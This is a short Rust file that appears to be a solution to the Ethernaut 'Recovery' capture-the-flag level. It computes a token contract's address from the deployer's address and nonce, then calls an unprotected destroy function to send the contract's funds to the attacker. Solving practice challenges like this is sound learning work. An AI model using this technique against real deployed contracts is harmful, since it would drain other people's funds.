use async_trait::async_trait;
use ctf::ethernaut::lvl17_recovery::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let derived_address =
            ethers::utils::get_contract_address(target.address, 1);

        let token = SimpleToken::new(derived_address, offender.to_owned());

        token.destroy(offender.address()).send().await?.await?;

        Ok(())
    }
}
